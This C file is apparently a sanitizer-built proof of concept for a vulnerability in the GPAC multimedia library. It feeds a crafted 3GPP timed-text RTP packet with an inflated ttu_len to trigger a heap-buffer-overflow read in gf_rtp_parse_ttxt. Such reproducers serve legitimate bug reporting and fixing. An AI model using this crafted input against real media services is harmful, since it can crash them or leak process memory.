/* PoC: heap-buffer-overflow read in gf_rtp_parse_ttxt (type==2 TTU, text segment)
 * triggered through the public RTP depacketizer API.
 *
 * Build (after `./configure --enable-sanitizer && make lib`):
 *   gcc -g -O0 -fsanitize=address -I include pocs/newbug.c \
 *       -L bin/gcc -lgpac -Wl,-rpath,bin/gcc -o /tmp/newbug
 * Run:
 *   /tmp/newbug
 */
#include <gpac/ietf.h>
#include <gpac/tools.h>
#include <string.h>
#include <stdlib.h>

static void on_sl_packet(void *udta, u8 *payload, u32 size, GF_SLHeader *hdr, GF_Err e)
{
}

int main(void)
{
	const char *sdp_text =
		"v=0\r\n"
		"o=- 0 0 IN IP4 127.0.0.1\r\n"
		"s=-\r\n"
		"t=0 0\r\n"
		"m=text 0 RTP/AVP 96\r\n"
		"a=rtpmap:96 3gpp-tt/1000\r\n"
		"a=fmtp:96 tx3g=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n";
	GF_SDPInfo *sdp;
	GF_SDPMedia *media;
	GF_RTPDepacketizer *rtp;
	GF_RTPHeader hdr;
	u8 *payload;
	u32 size = 20;

	gf_sys_init(GF_MemTrackerNone, NULL);

	sdp = gf_sdp_info_new();
	if (gf_sdp_info_parse(sdp, (char *) sdp_text, (u32) strlen(sdp_text)) != GF_OK) {
		return 1;
	}
	media = (GF_SDPMedia *) gf_list_get(sdp->media_desc, 0);
	if (!media) return 1;

	rtp = gf_rtp_depacketizer_new(media, 0, on_sl_packet, NULL);
	if (!rtp) return 1;

	/* craft a single 3GPP timed-text TTU of type 2 ("text segment") whose
	 * ttu_len claims the TTU spans exactly the whole payload, with no
	 * padding after the text payload */
	payload = malloc(size);
	memset(payload, 'A', size);
	payload[0] = 0x02;         /* is_utf16=0, reserved=0, type=2 */
	payload[1] = 0x00;         /* ttu_len hi */
	payload[2] = 0x13;         /* ttu_len = 19 = size-1 */
	payload[3] = 0x00;         /* nb_frag/cur_frag = 0/0 */
	payload[4] = 0x00;         /* duration byte 0 */
	payload[5] = 0x00;         /* duration byte 1 */
	payload[6] = 0x00;         /* duration byte 2 */
	payload[7] = 0x00;         /* sidx */
	payload[8] = 0x00;         /* complete text sample size, ignored */
	payload[9] = 0x00;
	/* payload[10..19] : text content filler */

	memset(&hdr, 0, sizeof(hdr));
	hdr.TimeStamp = 1000;
	hdr.Marker = 1;

	gf_rtp_depacketizer_process(rtp, &hdr, payload, size);

	free(payload);
	gf_rtp_depacketizer_del(rtp);
	gf_sdp_info_del(sdp);
	gf_sys_close();
	return 0;
}
